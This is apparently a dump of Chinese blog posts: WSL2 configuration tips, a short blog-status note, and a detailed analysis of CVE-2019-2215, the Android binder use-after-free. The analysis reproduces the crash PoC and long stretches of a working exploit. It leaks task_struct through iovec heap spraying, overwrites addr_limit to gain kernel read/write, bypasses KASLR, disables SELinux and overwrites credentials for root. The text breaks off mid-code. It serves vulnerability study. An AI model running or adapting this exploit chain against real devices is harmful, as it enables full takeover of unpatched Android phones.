[{"content":"WSL2使用技巧 0x00 常用配置 配置.wslconfig（比较常用）\n.wslconfig 用于在 WSL 2 上运行的所有已安装发行版中配置全局设置。\n存放在目录 C:\\Users[username] 下\n示例文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # Settings apply across all Linux distros running on WSL 2 [wsl2] # Limits VM memory to use no more than 4 GB, this can be set as whole numbers using GB or MB memory=4GB # Sets the VM to use two virtual processors processors=2 # Specify a custom Linux kernel to use with your installed distros. The default kernel used can be found at https://github.com/microsoft/WSL2-Linux-Kernel kernel=C:\\\\temp\\\\myCustomKernel # Sets additional kernel parameters, in this case enabling older Linux base images such as Centos 6 kernelCommandLine = vsyscall=emulate # Sets amount of swap storage space to 8GB, default is 25% of available RAM swap=8GB # Sets swapfile path location, default is %USERPROFILE%\\AppData\\Local\\Temp\\swap.vhdx swapfile=C:\\\\temp\\\\wsl-swap.vhdx # Disable page reporting so WSL retains all allocated memory claimed from Windows and releases none back when free pageReporting=false # Turn on default connection to bind WSL 2 localhost to Windows localhost localhostforwarding=true # Disables nested virtualization nestedVirtualization=false # Turns on output console showing contents of dmesg when opening a WSL 2 distro for debugging debugConsole=true # Enable experimental features [experimental] sparseVhd=true 配置wsl.conf\n• wsl.conf 用于为在 WSL 1 或 WSL 2 上运行的每个 Linux 发行版按各个发行版配置本地设置。\n放在发行版的/etc/下\n0x01 自编译内核 WSL2支持使用自编译的内核运行\n下载Kernel → microsoft/WSL2-Linux-Kernel: The source for the Linux kernel used in Windows Subsystem for Linux 2 (WSL2) (github.com)\n安装依赖\n$ sudo apt install build-essential flex bison dwarves libssl-dev libelf-dev\n修改需要的配置\n编译安装\n0x02 使用USBIP连接USB设备 dorssel/usbipd-win: Windows software for sharing locally connected USB devices to other machines, including Hyper-V guests and WSL 2. (github.com) 0x03 使用VHD解决卡顿问题 0x04 在WSL2上编译AOSP 0x05 使用WSLg图形界面 0x06 使用CAN/CANFD协议 0x07 WSL常用命令 1 2 3 4 5 6 7 8 ~ \u0026gt; wsl --version 01/11/2024 01:45:41 PM WSL 版本： 2.0.9.0 内核版本： 5.15.133.1-1 WSLg 版本： 1.0.59 MSRDC 版本： 1.2.4677 Direct3D 版本： 1.611.1-81528511 DXCore 版本： 10.0.25131.1002-220531-1700.rs-onecore-base2-hyp Windows 版本： 10.0.19045.2965 使用root作为默认用户\nwsl —\n升级WSL2/降级为WSL\nWSL2备份/恢复\n导出：wsl -export \u0026lt;Distro\u0026gt; \u0026lt;FileName\u0026gt; [选项] → wsl -export Ubuntu D:/bak/wslUbuntu.tar\n选项为 -vhd 可以将指定应将分发版导出为 .vhdx 文件 导入：wsl -import \u0026lt;Distro\u0026gt; \u0026lt;InstallLocation\u0026gt; \u0026lt;FileName\u0026gt; → wsl -import Ubuntu D:/wsl2/ubuntu D:/bak/wslUbuntu.tar\n0x08 WSL2上使用CUDA ","date":"2023-12-01T00:00:00Z","permalink":"https://ykiko.top/p/wsl2%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/","title":"WSL2使用技巧"},{"content":"博客正常运行中 H1 本博客基于Notion页面自动生成\nPublish地址：https://kuekiko.notion.site/14acc4eb33a24554a9224b2eafb61140?v=e0b848538c0c43108feebfcb8107f9c5\u0026amp;pvs=4\n转发地址：notion.ykiko.top\n特性 在Notion编写的文档自动更新到博客\n可定制更新频率，可实时更新也可定期更新\n自动备份相关文档\nNotion自动生成测试\n本文的Notion链接为：https://kuekiko.notion.site/6e834359fd8445b7b5005bc7c58d6c57?pvs=4\n每10分钟更新一次\n","date":"2023-09-01T00:00:00Z","permalink":"https://ykiko.top/p/%E5%8D%9A%E5%AE%A2%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C%E4%B8%AD/","title":"博客正常运行中"},{"content":"CVE-2019-2215分析利用记录 0x00 前言 CVE-2019-2215最初是由syzbot(syzkaller bot)在2017年发现的一个bug，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。\nProject Zero的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该漏洞。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。\n0x01 分析环境 Android avd api29 x86_64\nkernel：q-goldfish-android-goldfish-4.14-dev commit id 7a3cee43e935b9d526ad07f20bf005ba7e74d05b\npixel Android 10 kernel 3.18\n0x02 漏洞分析 漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。\n原理分析 先看一个project-zero公开的poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* binder_poll() passes the thread-\u0026gt;wait waitqueue that can be slept on for work. When a thread that uses epoll explicitly exits using BINDER_THREAD_EXIT, the waitqueue is freed, but it is never removed from the corresponding epoll data structure. When the process subsequently exits, the epoll cleanup code tries to access the waitlist, which results in a use-after-free. */ #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/epoll.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #define BINDER_THREAD_EXIT 0x40046208ul int main() { int fd, epfd; struct epoll_event event = {.events = EPOLLIN}; fd = open(\u0026#34;/dev/binder\u0026#34;, O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, \u0026amp;event); //[1] ioctl(fd, BINDER_THREAD_EXIT, NULL); //[2] } 漏洞原理作者说的很简单就是使用epoll线程调用BINDER_THREAD_EXIT时，会把binder_thread释放，但是没有在epoll数据结构中清除，在后面进程结束或者epoll主动调用EPOLL_CTL_DEL时，epoll又会去遍历前面释放的binder_thread-\u0026gt;wait，导致UAF。\n既然是个UAF的漏洞，我们主要关注三个点：binder_thread的allocate、free、use。\nallocate 在poc中的[1]处，通过epoll_ctl创建了一个新的ep_item并且绑定了fd，将其插入到event_poll的红黑树中。fd为前面通过调用open()创建的binder_proc结构体并且fd-\u0026gt;pricate_data = binder_proc，epfd为调用epoll_create创建的一个epoll结构体，该结构体会添加到结构体队列上。结构大概如图，图来源\nfree poc中的[2]处，调用ioctl对fd进行BINDER_THREAD_EXIT操作，从fd-\u0026gt;private_data中释放binder_thread结构体。整个调用栈如下图所示。最终调用到了binder_free_thread里的kfree释放掉。\n1 2 3 4 5 6 7 8 static void binder_free_thread(struct binder_thread *thread) { BUG_ON(!list_empty(\u0026amp;thread-\u0026gt;todo)); binder_stats_deleted(BINDER_STAT_THREAD); binder_proc_dec_tmpref(thread-\u0026gt;proc); put_task_struct(thread-\u0026gt;task); kfree(thread); } use 在当前线程退出时，会自动调用epoll_ctl(epfd, DEL, fd, event)，这里面会调用到ep_remove(event_poll, ep_item)，这个方法里面会进行unlink wait queues双链表操作，其中的操作entry = wait-\u0026gt;entry;这里的指针指向已经释放的binder_thread-\u0026gt;wait。造成use after free。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 static void ep_remove_wait_queue(struct eppoll_entry *pwq) //这里的pwq就是我们已经释放掉的binder_thread { wait_queue_head_t *whead; rcu_read_lock(); whead = smp_load_acquire(\u0026amp;pwq-\u0026gt;whead); if (whead) remove_wait_queue(whead, \u0026amp;pwq-\u0026gt;wait); //进入remove_wait_queue rcu_read_unlock(); } void remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry) { unsigned long flags; spin_lock_irqsave(\u0026amp;wq_head-\u0026gt;lock, flags); __remove_wait_queue(wq_head, wq_entry); //这里传入的第二个参数\u0026amp;pwq-\u0026gt;wait之前已经被释放 spin_unlock_irqrestore(\u0026amp;wq_head-\u0026gt;lock, flags); } static inline void __remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry) { list_del(\u0026amp;wq_entry-\u0026gt;entry); } static inline void list_del(struct list_head *entry) { __list_del_entry(entry); [...] } static inline void __list_del_entry(struct list_head *entry) { [...] __list_del(entry-\u0026gt;prev, entry-\u0026gt;next); } static inline void __list_del(struct list_head * prev, struct list_head * next) { next-\u0026gt;prev = prev; //unlink操作 WRITE_ONCE(prev-\u0026gt;next, next); } 将binder_thread-\u0026gt;wait.head的指针写入binder_thread-\u0026gt;wait.head.prev和binder_thread-\u0026gt;wait.head.next。\nPoc调试分析 这里手上没有直接能用的设备，用的模拟器调试。可直接按照这个教程的配置调试。不过这个教程关闭了一些保护，使得利用要简单些，不过过程是差不多一样的。\n编译完goldfish后启动emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S等待qemu的连接。\ngdb启动gdb -quiet vmlinux -ex 'target remote :1234' 键入c继续启动模拟器。\n等待模拟器完全启动后编译poc push进模拟器。\nbinder_thread释放之前，偏移a8处为wait.head的值，这里我们拥有内核源码以及编译好的vmliux，所以可以直接算出来wait.head相对于binder_thread地址的偏移量。\nfree之后未unlink之前binder_thread的值一样未变。\nunlink之后，binder_thread-\u0026gt;wait.head写入binder_thread-\u0026gt;wait.head.next and binder_thread-\u0026gt;wait.head.prev两个指针。\n在未开启KASan的设备上我们看不到任何奔溃。但是调试时我们能看到确实触发了漏洞。\n0x03 漏洞利用 漏洞t_thread结构体如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 struct binder_thread { struct binder_proc *proc; struct rb_node rb_node; struct list_head waiting_thread_node; int pid; int looper; /* only modified by this thread */ bool looper_need_return; /* can be written by other thread */ struct binder_transaction *transaction_stack; struct list_head todo; bool process_todo; struct binder_error return_error; struct binder_error reply_error; wait_queue_head_t wait; struct binder_stats stats; atomic_t tmp_ref; bool is_dead; struct task_struct *task; }; 注意看该结构体中有个task成员，为task_struct类型。我们首先要做的就是泄露这个结构体的地址，将它改为NULL之后，执行提权语句。下面根据exp分析整个提权的流程。\npatch addr_limit 阻止我们拿到权限的第一道关卡为task_struct结构体成员thread_info中的addr_limit（在x86_64上是直接作为task_struct的成员），用于隔离内核空间和用户空间。如果我们能控制它的值，相当于我们能完全的访问内核空间。所以第一步就是把addr_limit patch掉。\n想要patch掉addr_limit，得先泄露出task_struct的地址，再将值改为0xFFFFFFFFFFFFFFFE。后面再说为什么要改为这个值。\n这里先了解一下vectored I/O，也称为分散/聚集 I/O，是一种可以在单次系统调用中对多个缓冲区输入输出的方法，可以把多个缓冲区的数据写到单个数据流，也可以把单个数据流读到多个缓冲区中。与线性 I/O 相比，vectored I/O有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。支持原子性。使用vectored I/O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用而不是两个系统调用对其进行读取或写入。\nreadv() 函数从文件描述符 fd 中读取 count 个段 (segment) (一个段即一个 iovec 结构体）到参数 iov 所指定的缓冲区中。\nwrite() 函数从参数 iov 指定的缓冲区中读取 count 个段的数据，并写入 fd 中。\n1 2 3 #include \u0026lt;sys/uio.h\u0026gt; ssize_t readv (int fd, const struct iovec *iov,vint count); ssize_t writev(int fd,const struct iovec *iov, int count); 每个 iovec 结构体描述一个独立的，物理不连续的缓冲区，我们称其为段(segment)，每个iovec结构体相对较小，在64bit系统下iovec的大小仅为0x10。\n1 2 3 4 5 struct iovec { void __user *iov_base; /* BSD uses caddr_t (1003.1g requires void *) */ __kernel_size_t iov_len; /* Must be size_t (1003.1g) */ }; 如何泄露出task_struct？看了几个exp，都用的是struct iovec去占位覆盖前面释放的binder_thread。这也是Project Zero的做法。这个方法最初是由Keen实验室提出的，iovec具有一些小特性使得它很适合用来作为攻击的媒介：\n在64bit系统下只有0x10的大小\n容易控制它的成员iov_base和iov_len。\n可以控制写入的个数控制iovec最终进入哪个kmalloc缓存\n它有一个指向缓冲区的指针和一个长度，这是使用unlink进行破坏的理想字段\n可通过readv、writev、recvmsg、sendmsg等系统调用和iovec是实现linux下的Vectored I/O。在漏洞利用中我们可以利用来绕过检查，对已释放的空间进行占位布局堆风水。\n看看exp如何如来泄露信息，作者写了很详细的注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 void BinderUaF::leakTaskStruct() { int pipe_fd[2] = {0}; ssize_t nBytesRead = 0; static char dataBuffer[PAGE_SIZE] = {0}; struct iovec iovecStack[IOVEC_COUNT] = {nullptr}; // Get binder fd setupBinder(); // Create event poll setupEventPoll(); // We are going to use iovec for scoped read/write, // we need to make sure that iovec stays in the kernel // before we trigger the unlink after binder_thread has // been freed. // One way to achieve this is by using the blocking APIs // in Linux kernel. Such APIs are read, write, etc on pipe. // Setup pipe for iovec INFO(\u0026#34;[+] Setting up pipe\\n\u0026#34;); if (pipe(pipe_fd) == -1) { ERR(\u0026#34;\\t[-] Unable to create pipe\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Pipe created successfully\\n\u0026#34;); } // // pipe_fd[0] = read fd // pipe_fd[1] = write fd // // Default size of pipe is 65536 = 0x10000 = 64KB // This is way much of data that we care about // Let\u0026#39;s reduce the size of pipe to 0x1000 // if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) == -1) { ERR(\u0026#34;\\t[-] Unable to change the pipe capacity\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Changed the pipe capacity to: 0x%x\\n\u0026#34;, PAGE_SIZE); } INFO(\u0026#34;[+] Setting up iovecs\\n\u0026#34;); // // As we are overlapping binder_thread with iovec, // binder_thread-\u0026gt;wait.lock will align to iovecStack[10].io_base. // // If binder_thread-\u0026gt;wait.lock is not 0 then the thread will get // stuck in trying to acquire the lock and the unlink operation // will not happen. // // To avoid this, we need to make sure that the overlapped data // should be set to 0. // // iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if // we can pass a valid memory address whose lower 32bit value is 0, // then we can avoid spin lock issue. // mmap4gbAlignedPage(); iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE; // Now link the poll wait queue to binder thread wait queue linkEventPollWaitQueueToBinderThreadWaitQueue(); // // We should trigger the unlink operation when we // have the binder_thread reallocated as iovec array // // Now fork pid_t childPid = fork(); if (childPid == 0) { // // child process // There is a race window between the unlink and blocking // in writev, so sleep for a while to ensure that we are // blocking in writev before the unlink happens sleep(2); // Trigger the unlink operation on the reallocated chunk unlinkEventPollWaitQueueFromBinderThreadWaitQueue(); // // First interesting iovec will read 0x1000 bytes of data. // This is just the junk data that we are not interested in // nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer)); if (nBytesRead != PAGE_SIZE) { ERR(\u0026#34;\\t[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x\u0026#34;, nBytesRead, PAGE_SIZE); exit(EXIT_FAILURE); } exit(EXIT_SUCCESS); } // parent process // I have seen some races which hinders the reallocation. // So, now freeing the binder_thread after fork. // freeBinderThread(); // // Reallocate binder_thread as iovec array // // We need to make sure this writev call blocks // This will only happen when the pipe is already full // This print statement was ruining the reallocation, // spent a night to figure this out. Commenting the // below line. // // INFO(\u0026#34;[+] Reallocating binder_thread\\n\u0026#34;); ssize_t nBytesWritten = writev(pipe_fd[1], iovecStack, IOVEC_COUNT); // If the corruption was successful, the total bytes written // should be equal to 0x2000. This is because there are two // valid iovec and the length of each is 0x1000 if (nBytesWritten != PAGE_SIZE * 2) { ERR(\u0026#34;\\t[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x\\n\u0026#34;, nBytesWritten, PAGE_SIZE * 2); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Wrote 0x%lx bytes\\n\u0026#34;, nBytesWritten); } // Now read the actual data from the corrupted iovec // This is the leaked data from kernel address space // and will contain the task_struct pointer nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer)); if (nBytesRead != PAGE_SIZE) { ERR(\u0026#34;\\t[-] read failed. nBytesRead: 0x%lx, expected: 0x%x\u0026#34;, nBytesRead, PAGE_SIZE); exit(EXIT_FAILURE); } // Wait for the child process to exit wait(nullptr); m_task_struct = (struct task_struct *) *((int64_t *) (dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA)); m_pidAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, pid)); m_credAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, cred)); m_nsproxyAddress = (void *) ((int8_t *) m_task_struct + offsetof(struct task_struct, nsproxy)); INFO(\u0026#34;[+] Leaked task_struct: %p\\n\u0026#34;, m_task_struct); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;pid: %p\\n\u0026#34;, m_pidAddress); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;cred: %p\\n\u0026#34;, m_credAddress); INFO(\u0026#34;\\t[*] \u0026amp;task_struct-\u0026gt;nsproxy: %p\\n\u0026#34;, m_nsproxyAddress); } 很好理解，exp这部分首先初始化环境之后创建用于readv和writev的pipe，readv和writev函数用于在一次函数调用中读、写多个非连续缓冲区。修改pipe的size为0x1000。\n之后创建了25个iovec，放在iovecStack里面。25个是根据binder_thread和iovec的大小算出来\nIOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))\nbinder_thread结构体大小为408，25个iovec大小为25*16=400，正好。计算对比binder_thread中wait.head的偏移0xA0和iovecStack的偏移iovecStack[10].iov_len匹配。\n前面动态调试时也能看到会有两个地址的值会被写入地址，这里相对应的位置为iovecStack[10].iov_len 和iovecStack[11].io_base。所以我们这里要修改iovecStack[10]的iov_len和pipe一样的大小，阻塞掉父进程的writev系统调用，再去触发unlink操作。\n这里的iovecStack[10].io_base正好对上binder_thread-\u0026gt;wait.lock，如果这个值不为0的话，后面在尝试取自旋锁锁会出问题，不进行unlink操作，这个值是32bit的，iov_base是64bit的，所以要设置对齐，使用mmap保证低32bit为0。\niovecStack[10].iov_len和iovecStack[11].iov_len设置为pipe size的大小，iovecStack[11].io_base 设置为新分配的一个地址，\n创建fork子进程进行EPOLL_CTL_DEL操作触发unlink。读出0x1000 bytes的垃圾数据恢复进程，\n父进程free掉binder_thread，调用writev系统进行阻塞，等待子进程完成。\n最后父进程在调用read读出已经被子进程覆盖了内核地址处的数据，根据偏移读出泄露的task_struct指针。\n下面这张图是Project Zero blog贴出来的流程图，方便理解整个过程。\n既然已经有task_struct指针，接下来就可以patch 掉AddrLimit。直接看exp实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 void BinderUaF::clobberAddrLimit() { int sock_fd[2] = {0}; ssize_t nBytesWritten = 0; struct msghdr message = {nullptr}; struct iovec iovecStack[IOVEC_COUNT] = {nullptr}; // Get binder fd setupBinder(); // Create event poll setupEventPoll(); INFO(\u0026#34;[+] Setting up socket\\n\u0026#34;); if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) == -1) { ERR(\u0026#34;\\t[-] Unable to create socketpair\\n\u0026#34;); exit(EXIT_FAILURE); } else { INFO(\u0026#34;\\t[*] Socketpair created successfully\\n\u0026#34;); } // // We will just write junk data to socket so that when recvmsg // is called it process the fist valid iovec with this junk data // and then blocks and waits for the rest of the data to be received // static char junkSocketData[] = { 0x41 }; INFO(\u0026#34;[+] Writing junk data to socket\\n\u0026#34;); nBytesWritten = write(sock_fd[1], \u0026amp;junkSocketData, sizeof(junkSocketData)); if (nBytesWritten != sizeof(junkSocketData)) { ERR(\u0026#34;\\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\\n\u0026#34;, nBytesWritten, sizeof(junkSocketData)); exit(EXIT_FAILURE); } // // Write junk data to the socket so that when recvmsg is // called, it process the first valid iovec with this junk // data and then blocks for the rest of the incoming socket data // INFO(\u0026#34;[+] Setting up iovecs\\n\u0026#34;); // We want to block after processing the iovec at IOVEC_WQ_INDEX, // because then, we can trigger the unlink operation and get the // next iovecs corrupted to gain scoped write. mmap4gbAlignedPage(); iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = 1; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8; iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242; iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8; // // Prepare the data buffer that will be written to socket // Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64 // will result in crash because of a check in do_page_fault // However, x86_64 does not have this check. But it\u0026#39;s better // to set it to 0xFFFFFFFFFFFFFFFE so that this same code can // be used in arm64 as well. // static uint64_t finalSocketData[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len (uint64_t) ((uint8_t *) m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value }; // // Prepare the message // message.msg_iov = iovecStack; message.msg_iovlen = IOVEC_COUNT; // // Now link the poll wait queue to binder thread wait queue // linkEventPollWaitQueueToBinderThreadWaitQueue(); // // We should trigger the unlink operation when we // have the binder_thread reallocated as iovec array // Now fork pid_t childPid = fork(); if (childPid == 0) { // // child process // There is a race window between the unlink and blocking // in writev, so sleep for a while to ensure that we are // blocking in writev before the unlink happens // sleep(2); // // Trigger the unlink operation on the reallocated chunk // unlinkEventPollWaitQueueFromBinderThreadWaitQueue(); // // Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len // and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered // // Write rest of the data to the socket so that recvmsg starts // processing the corrupted iovecs and we get scoped write and // finally arbitrary write nBytesWritten = write(sock_fd[1], finalSocketData, sizeof(finalSocketData)); if (nBytesWritten != sizeof(finalSocketData)) { ERR(\u0026#34;\\t[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx\u0026#34;, nBytesWritten, sizeof(finalSocketData)); exit(EXIT_FAILURE); } exit(EXIT_SUCCESS); } // parent process // I have seen some races which hinders the reallocation. // So, now freeing the binder_thread after fork. freeBinderThread(); // Reallocate binder_thread as iovec array and // we need to make sure this recvmsg call blocks. // recvmsg will block after processing a valid iovec at // iovecStack[IOVEC_WQ_INDEX] ssize_t nBytesReceived = recvmsg(sock_fd[0], \u0026amp;message, MSG_WAITALL); // If the corruption was successful, the total bytes received // should be equal to length of all iovec. This is because there // are three valid iovec ssize_t expectedBytesReceived = iovecStack[IOVEC_WQ_INDEX].iov_len + iovecStack[IOVEC_WQ_INDEX + 1].iov_len + iovecStack[IOVEC_WQ_INDEX + 2].iov_len; if (nBytesReceived != expectedBytesReceived) { ERR(\u0026#34;\\t[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx\\n\u0026#34;, nBytesReceived, expectedBytesReceived); exit(EXIT_FAILURE); } // Wait for the child process to exit wait(nullptr); } 这里就要将addr_limit的值改为0xFFFFFFFFFFFFFFFE在arm64里有个检查函数do_page_fault会检测该值是否为0xFFFFFFFFFFFFFFFF，如果是就触发奔溃，所以一般都设为0xFFFFFFFFFFFFFFFE。\n前面是从内核读出数据，这里要实现的是向内核写入数据。\n看看这里的iovecStack结构：\n1 2 3 4 5 6 iovecStack[IOVEC_WQ_INDEX].iov_base = m_4gb_aligned_page; iovecStack[IOVEC_WQ_INDEX].iov_len = 1; iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *) 0x41414141; iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8; iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *) 0x42424242; iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8; 和前面泄露信息的布局是差不多。\n首先依然是初始化环境，先向socket写入了1byte的垃圾数据，之后父进程使用recvmsg系统调用接收了1byte的数据之后进行阻塞，这里选用了recvmsg而不是前面writev是因为iovecStack[10].iov_len变成了一个指针，很大的数字，后续调用copy_page_to_iter_iovec复制数据时会出错。\n子进程进行unlink操作，将精心构造的finalSocketData写入socket，父进程恢复接收数据，这时iovecStack[11]已经被破坏掉了，等到recvmsg系统调用返回时，就可以修改掉addr_limit的值。\n1 2 3 4 5 6 7 8 static uint64_t finalSocketData[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len (uint64_t) ((uint8_t *) m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT), // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value }; 对应上面的值。\n到这里我们就有了完整的内核读写权限，接下绕过kaslr、禁用SElinux、patchCred就可以获得root权限。\nbypass kaslr and Disabling SELinux 前面已经了有了完整的读写权限，那这就很简单了。\n任意读写的实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 void BinderUaF::kRead(void *Address, size_t Length, void *uBuffer) { ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], Address, Length); if ((size_t) nBytesWritten != Length) { ERR(\u0026#34;[-] Failed to write data from kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], uBuffer, Length); if ((size_t) nBytesRead != Length) { ERR(\u0026#34;[-] Failed to read data from kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } } void BinderUaF::kWrite(void *Address, size_t Length, void *uBuffer) { ssize_t nBytesWritten = write(m_kernel_rw_pipe_fd[1], uBuffer, Length); if ((size_t) nBytesWritten != Length) { ERR(\u0026#34;[-] Failed to write data from user: %p\u0026#34;, Address); exit(EXIT_FAILURE); } ssize_t nBytesRead = read(m_kernel_rw_pipe_fd[0], Address, Length); if ((size_t) nBytesRead != Length) { ERR(\u0026#34;[-] Failed to write data to kernel: %p\u0026#34;, Address); exit(EXIT_FAILURE); } } 任意读的话，利用write和read两个系统调用，使用write将数据写到pipe，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。任意写的话，与之相反。这样就实现了任意读写。\ntask_struct 有一个全局指针nsproxy ，前面已经泄露出来了，就可以更具偏移直接算出Kernel_base_addr。\n1 2 3 4 5 6 7 8 9 10 11 12 13 ptrdiff_t kernelBase = nsProxy - SYMBOL_OFFSET_init_nsproxy; auto selinuxEnforcing = (void *) (kernelBase + SYMBOL_OFFSET_selinux_enforcing); INFO(\u0026#34;\\t[*] nsproxy: 0x%lx\\n\u0026#34;, nsProxy); INFO(\u0026#34;\\t[*] Kernel base: 0x%lx\\n\u0026#34;, kernelBase); INFO(\u0026#34;\\t[*] selinux_enforcing: %p\\n\u0026#34;, selinuxEnforcing); int selinuxEnabled = kReadDword(selinuxEnforcing); if (!selinuxEnabled) { INFO(\u0026#34;\\t[*] selinux enforcing is disabled\\n\u0026#34;); return; } INFO(\u0026#34;\\t[*] selinux enforcing is enabled\\n\u0026#34;); kWriteDword(selinuxEnforcing, 0x0); 这里只需要对于SELinux只需根据kernelBase 计算出具体的地址，再直接进行写入0x0即可禁用掉。\n现在的版本越来越多保护和检查机制，实际上直接这样不一定是不可行，有时得恢复kallsyms表才行\nRoot 提权的常用语句commit_creds(prepare_kernel_cred(NULL));，这就是常规的套路了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, uid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, gid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, suid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, sgid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, euid)), GLOBAL_ROOT_UID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, egid)), GLOBAL_ROOT_GID); kWriteDword((void *) ((uint8_t *) m_cred + offsetof(struct cred, fsuid)), 